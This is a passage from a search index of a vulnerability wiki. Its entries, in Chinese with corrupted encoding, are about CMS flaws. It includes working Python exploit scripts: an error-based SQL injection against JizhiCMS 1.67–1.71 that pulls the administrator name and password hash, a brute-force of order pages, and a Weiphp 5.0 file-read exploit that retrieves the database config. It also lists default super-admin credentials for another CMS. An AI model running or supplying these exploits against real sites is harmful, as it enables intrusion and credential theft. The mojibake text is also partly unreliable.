2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html","title":"æè‡´CMS 1.71 + 1.7 + 1.67 ç‰ˆæœ¬sqlæ³¨å…¥","keywords":"","body":"æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥(æ”¯ä»˜æ’ä»¶) æŸ¥çœ‹ä¸€ä¸‹è¿›è¡Œè¿‡æ»¤çš„å‡½æ•° /** å‚æ•°è¿‡æ»¤ï¼Œæ ¼å¼åŒ– **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://æ•´æ•° return (int)$value; case 1://å­—ç¬¦ä¸² $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://æ•°ç»„ if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://æµ®ç‚¹ return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //è¿‡æ»¤XSSæ”»å‡» function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸² $arr[$key] = htmlentities(strip_tags($value)); //å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“ } else { SafeFilter($arr[$key]); } } } } çœ‹ä¸€ä¸‹æ‰§è¡Œçš„SQLè¯­å¥çš„å‡½æ•° // æŸ¥è¯¢ä¸€æ¡ public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } è·Ÿè¿› findAll å‡½æ•° // æŸ¥è¯¢æ‰€æœ‰ public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } åœ¨è·Ÿè¿›ä¸€ä¸‹getDataå‡½æ•° //è·å–æ•°æ® public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } è·Ÿè¿›queryæ‰§è¡Œå‡½æ•° //æ‰§è¡ŒSQLè¯­å¥å¹¶æ£€æŸ¥æ˜¯å¦é”™è¯¯ public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('æ•°æ®åº“é”™è¯¯ï¼š' . $msg[2] . end($this->filter)); } } çœ‹åˆ°$msg = $this->pdo->errorInfo();è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šæŠŠæ•°æ®åº“æŠ¥é”™ä¿¡æ¯æ‰“å°åœ¨é¡µé¢ä¸Šå¹¶æ˜¾ç¤ºå‡ºæ¥å¹¶é€€å‡º ä¸€å¥—åˆ†æä¸‹æ¥æ²¡æœ‰å‘ç°å¯¹sqlè¯­å¥çš„è¿‡æ»¤ï¼Œå¦‚æœå¾—åˆ°çš„æ•°æ®æ²¡æœ‰ç»è¿‡format_paramè¿‡æ»¤ï¼Œä¼šäº§ç”Ÿæ³¨å…¥ ä¾‹å¦‚: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } å¦‚æœç›´æ¥è¿™æ ·GET POST REQUEST å¸¦å…¥æ•°æ®åº“ ä¼šäº§ç”ŸæŠ¥é”™æ³¨å…¥ ä¾‹å¦‚ ./exploit/name=123' (åŠ ä¸€ä¸ªå¼•å·ä¼šæŠ¥é”™ï¼Œå¦‚æœå¼•å·æ²¡è¿‡æ»¤) ç°åœ¨åªéœ€è¦å¯»æ‰¾ç±»å‹æ˜¯è¿™æ ·æ²¡è¿‡æ»¤ç›´æ¥å¸¦å…¥æ•°æ®åº“çš„è¯­å¥å°±è¡Œäº† ç®€å•å¯»æ‰¾ä¸‹å…¶å®è¿™æ ·çš„åœ°æ–¹æŒºå¤šçš„ï¼Œæ‹¿ä¸€ä¸ªä½ç½®ä¸¾ä¾‹å­ è¿™é‡Œæ˜¯ä¸€ä¸ªæ”¯ä»˜æ’ä»¶çš„ä½ç½®ï¼Œè“è‰²æ–¹å—1å¢åŠ ä»£ç æ¨¡æ‹Ÿå¼€é€šæ”¯ä»˜å®åŠŸèƒ½é€šè¿‡éªŒè¯ å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°åªä½¿ç”¨[htmlspecialchars]æ¥è¿‡æ»¤äº†xssï¼Œsqlè¯­å¥æ²¡æœ‰è¿‡æ»¤ï¼Œç”¨åˆšåˆšçš„æ–¹æ³•æ¥æ³¨å…¥ å¯ä»¥çœ‹åˆ°çš„ç¡®å‡ºç°äº†sqlè¯­å¥å’Œæ•°æ®åº“é”™è¯¯ ç›´æ¥æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" å®˜ç½‘url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: æè‡´CMS 1.67 - 171 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('é€‰æ‹©ä½¿ç”¨çš„pocï¼š\\n' '1.sqlæ³¨å…¥\\n' '2.ç”¨æˆ·è´­ç‰©è½¦çˆ†ç ´\\n' '3.GET ç½‘ç«™ç®¡ç†å‘˜è´¦å·å¯†ç \\n' '4.é€€å‡º quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('å‚æ•°é”™è¯¯ï¼Œé‡æ–°è¾“å…¥') def poc_1(): ## poc_1 ---> sqlæ³¨å…¥æ¼æ´ç‚¹( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //æ”¯ä»˜å®å…¬é’¥ï¼Œè´¦æˆ·ä¸­å¿ƒ->å¯†é’¥ç®¡ç†->å¼€æ”¾å¹³å°å¯†é’¥ï¼Œæ‰¾åˆ°æ·»åŠ äº†æ”¯ä»˜åŠŸèƒ½çš„åº”ç”¨ï¼Œæ ¹æ®ä½ çš„åŠ å¯†ç±»å‹ï¼ŒæŸ¥çœ‹æ”¯ä»˜å®å…¬é’¥ $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //éªŒè¯ç­¾å $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; ä»˜æ¬¾æˆåŠŸ'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); å‘å¸ƒæ—¶é—´ 2020-05-25]') else: print('å¾—åˆ°çš„æ•°æ®ä¸º:\\n', data) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> ç”¨æˆ·è´­ç‰©è½¦é¡µé¢è·å– (Home/c/UserController.php [orderdetails]) ## æ¼æ´ç‚¹ ---> æ— ç”¨æˆ·cookie id çš„éªŒè¯ ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.8ä»¥ä¸‹å…¨ç‰ˆæœ¬ (å½“å‰æœ€æ–° v1.8 æ›´æ–°æ—¶é—´:6æœˆ30æ—¥) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //è¶…æ—¶æˆ–è€…å·²æ”¯ä»˜ if($order['isshow']==0){ $msg = 'è®¢å•å·²åˆ é™¤'; } if($order['isshow']==3){ $msg = 'è®¢å•å·²è¿‡æœŸï¼Œä¸å¯æ”¯ä»˜ï¼'; } if($order['isshow']==2){ $msg = 'è®¢å•å·²æ”¯ä»˜ï¼Œè¯·å‹¿é‡å¤æ“ä½œï¼'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //å…¼å®¹å¤šæ¨¡å—åŒ– if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) year_day = str(input(\"è¾“å…¥æ—¥æœŸ(ä¾‹å¦‚:20200712):\")) shop = [] # éå†æ‰€æœ‰å‡ºç°çš„ç”¨æˆ·è´­ç‰©è½¦é¡µé¢ for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # æ‰“å°ç»“æœ if 'æ€»é‡‘é¢' in response.text: print('è´­ç‰©è½¦é¡µé¢ï¼š',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> å¾—åˆ°è´¦å·å¯†ç  ( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ ---> æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # ç”¨æˆ·å + å¯†ç  é•¿åº¦ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # å¾—åˆ°è´¦å·å¯†ç ï¼Œå¯†ç md5æ ¼å¼ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # åˆ†å‰²è´¦å·å¯†ç  admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"æˆåŠŸå¾—åˆ°è´¦å·å¯†ç ï¼š\\n\" \"ç”¨æˆ·å:\",admin, \"\\nå¯†ç (md5):\",passwd) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() è´­ç‰©è½¦çˆ†ç ´æ²¡æœ‰åˆ©ç”¨ç‚¹ï¼Œå…³äºå®¡è®¡éƒ¨åˆ†å‚è€ƒæè‡´CMSå®¡è®¡ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS.html","title":"æè‡´CMS <1.81 ç‰ˆæœ¬ å­˜å‚¨å‹XSS","keywords":"","body":"æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS æ¼æ´å¤ç° ç™»å½•ç®¡ç†å‘˜æ·»åŠ æ¨¡å— æ³¨å†Œç”¨æˆ· ç‚¹å‡»å‘å¸ƒæ–‡ç«  åœ¨æ–‡ç« æ ‡é¢˜å¤„æ’å…¥xss payload å½“ç®¡ç†å‘˜è®¿é—®æ—¶XSSæˆåŠŸ å‚è€ƒ æè‡´CMSä»£ç å®¡è®¡ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/","title":"åå®œäº’è”CMS","keywords":"","body":"åå®œäº’è”CMS åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´.html","title":"åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´","keywords":"","body":"åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ æ¼æ´æè¿° åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ï¼Œå¦‚ä¸ä¿®æ”¹åˆ™ä½¿ç”¨é»˜è®¤è´¦å·å¯†ç å³å¯ç™»å½•è¶…çº§ç®¡ç†å‘˜ å½±å“ç‰ˆæœ¬ åå®œäº’è”CMS FOFA [!NOTE] body=\"åå®œç½‘ç»œ\" æ¼æ´å¤ç° åŸç‰ˆçš„æºç éœ€è¦ä»˜è´¹ï¼Œå¯æ‰¾åˆ°å…è´¹ç‰ˆçš„æºç  åœ¨ç›®å½•ä¸‹çš„DATAç›®å½•ä¸­æœ‰mdbæ–‡ä»¶, æ‰“å¼€åå¯ä»¥å‘ç°å­˜åœ¨é»˜è®¤çš„ä¸¤ä¸ªç”¨æˆ· [!NOTE] admin/123456 lu123/cui123 ä½¿ç”¨ ç”¨æˆ·lu123 å³å¯ç™»å½•è¶…çº§ç®¡ç†å‘˜ å‚è€ƒæ–‡ç«  åå®œäº’è”0dayåˆ†äº« WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/Weiphp/":{"url":"PeiQi_Wiki/CMSæ¼æ´/Weiphp/","title":"Weiphp","keywords":"","body":"Weiphp Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596 Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596.html","title":"Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596","keywords":"","body":"Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– æ¼æ´æè¿° Weiphp5.0 å­˜åœ¨å‰å°æ–‡ä»¶ä»»æ„è¯»å–æ¼æ´ï¼Œå¯ä»¥è¯»å–æ•°æ®åº“é…ç½®ç­‰æ•æ„Ÿæ–‡ä»¶ å½±å“ç‰ˆæœ¬ [!NOTE] Weiphp ç¯å¢ƒæ­å»º weiphp5.0å®˜æ–¹ä¸‹è½½å‚è€ƒæ‰‹å†Œ å‚è€ƒå®˜æ–¹æ‰‹å†Œåˆ›å»ºç½‘ç«™å³å¯ æ¼æ´å¤ç° æ¼æ´å‡½æ•°æ–‡ä»¶:application\\material\\controller\\Material.php æ¼æ´å‡½æ•°:_download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // è·å–å›¾ç‰‡URL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) && $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // è·å–å›¾ç‰‡æ‰©å±•å $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } return $cover_id; } é¦–å…ˆæ³¨æ„åˆ°å‡½æ•°çš„æ ‡è¯†ä¸ºpublicï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå‡½æ•°æ˜¯å…¬å…±è°ƒç”¨çš„ï¼Œå¹¶ä¸”å˜é‡picUrlä¸ºå¯æ§å˜é‡ æ ¹æ®ä»£ç ä»ä¸Šå‘ä¸‹åˆ†æ $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); å˜é‡$savePathç¡®å®šæ–‡ä»¶ä¸Šä¼ åçš„ç¼“å­˜ä½ç½®ä¸º/public/uploads/picture/ï¼Œå¹¶æŒ‰ç…§å¹´-æœˆ-æ—¥ åˆ›å»ºæ–‡ä»¶å¤¹ å‘ä¸‹å¯¹å˜é‡$picUrl æ˜¯å¦ä¸ºç©ºè¿›è¡Œåˆ¤æ–­ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦è¿›è¡Œç™»å½•ï¼Œè¿™é‡Œä½¿ç”¨POSTä¼ å‚è¿›è¡ŒéªŒè¯ç™»å½•ç»•è¿‡ï¼Œè·³è½¬åˆ°elseè¯­å¥ä¸‹ else { $content = wp_file_get_contents($picUrl); // è·å–å›¾ç‰‡æ‰©å±•å $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } åˆ†æä¼ å…¥å˜é‡ picUrl çš„ wp_file_get_contentsæ–¹æ³• $content = wp_file_get_contents($picUrl); å‡½æ•°æ–‡ä»¶ä½ç½® application\\common.php å¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰å¯¹æˆ‘ä»¬çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œåªåšäº†ä¸€ä¸ªæœ‰å…³è¶…æ—¶çš„æ“ä½œ, å›åˆ°å‡½æ•°ç»§ç»­å‘ä¸‹åˆ†æ $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); è¿™é‡Œåˆ›å»ºäº†æœ‰å…³å½“å‰æ—¶é—´çš„å›¾ç‰‡æ–‡ä»¶ï¼Œå¹¶å†™å…¥æ–‡ä»¶å¤¹/public/uploads/picture/ ä¸‹ æˆ‘ä»¬å…ˆå°è¯•æ§åˆ¶å˜é‡ $picUrl æ¥å†™å…¥æ•°æ®åº“é…ç½®æ–‡ä»¶åˆ°å›¾ç‰‡ä¸­ /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php æŸ¥çœ‹ç›®å½•/public/uploads/picture/ï¼Œå¹¶ç”¨è®°äº‹æœ¬æ‰“å¼€å†™å…¥çš„jpgæ–‡ä»¶ å¾—åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶çš„ä¿¡æ¯ï¼Œæ—¢ç„¶è¿™ä¸ªå˜é‡å¯æ§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•ä¸‹è½½æœ¨é©¬æ–‡ä»¶ï¼Œå†é€šè¿‡è§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«ç­‰å…¶ä»–æ¼æ´æ¥getshell åœ¨å½“å‰æ¡ä»¶ä¸‹å¹¶ä¸çŸ¥é“æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥å›åˆ°ä»£ç ä¸­ç»§ç»­å¯»æ‰¾å¯ä»¥è·å–æ–‡ä»¶åçš„åŠæ³• if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } å‘ä¸‹è·Ÿè¿› addFile å‡½æ•° å‡½æ•°ä½ç½®:application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this->where('md5', $data['md5'])->value('id'); if ($id > 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this->insertGetId($data); return $id; } å¯ä»¥çœ‹åˆ°è¿™éƒ¨åˆ†ä»£ç å†™å…¥äº† Picture è¡¨ä¸­ $id = $this->insertGetId($data); æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“çš„è¿™ä¸ªæ•°æ®è¡¨ï¼Œå¯ä»¥å‘ç°ä¹‹å‰æ‰€ä¸Šä¼ çš„æ•°æ®å…¨éƒ¨ç¼“å­˜åœ¨è¿™ä¸ªè¡¨é‡Œäº† æˆ‘ä»¬ç°åœ¨åˆ™éœ€è¦æ‰¾åˆ°ä¸éœ€è¦ç™»å½•çš„åœ°æ–¹æ¥è·å¾—è¿™äº›æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥å…¨å±€å»æŸ¥æ‰¾è°ƒç”¨äº†è¿™ä¸ª Picture è¡¨çš„åœ°æ–¹ æ‰¾åˆ°ä¸€å¤„å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')->where(wp_where($map)) ->order('id desc') ->select(); $this->assign('picList', $picList); exit($this->fetch()); } è·Ÿè¿› get_wpid å‡½æ•° function get_wpid($wpid = '') { if (defined('WPID')) { return WPID; } else { return 0; } } æŸ¥çœ‹ WPID çš„å®šä¹‰ï¼Œæ–‡ä»¶ä½ç½®åœ¨config\\weiphp_define.php å®šä¹‰å€¼é»˜è®¤ä¸º 1ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨åˆ™å¯ä»¥è·å¾—æ•°æ®åº“ä¸­Pictrueè¡¨çš„å†…å®¹ï¼Œé—´æ¥çš„çŸ¥é“äº†æ–‡ä»¶å†…å®¹ä»¥åŠæ–‡ä»¶å è®¿é—®åœ°å€: http://webphp/public/index.php/home/file/user_pids å¯ä»¥çœ‹åˆ°æ–‡ä»¶åï¼Œæ ¹æ®urlåœ°å€è®¿é—®é€‰æ‹©ä¸‹è½½å³å¯ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Weiphp5.0 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): upload_url = target_url + \"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } data = { \"1\":1 } try: response = requests.post(url=upload_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°† database.phpæ–‡ä»¶ å†™å…¥Pictrueè¡¨ä¸­\\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_2(target_url): vnln_url = target_url + \"/public/index.php/home/file/user_pics\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vnln_url, headers=headers).text href = re.findall(r'>> \\033[0m\")) POC_1(target_url) image_url = POC_2(target_url) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€ .html","title":"Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€ ","keywords":"","body":"Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  æ¼æ´æè¿° Weiphp5.0 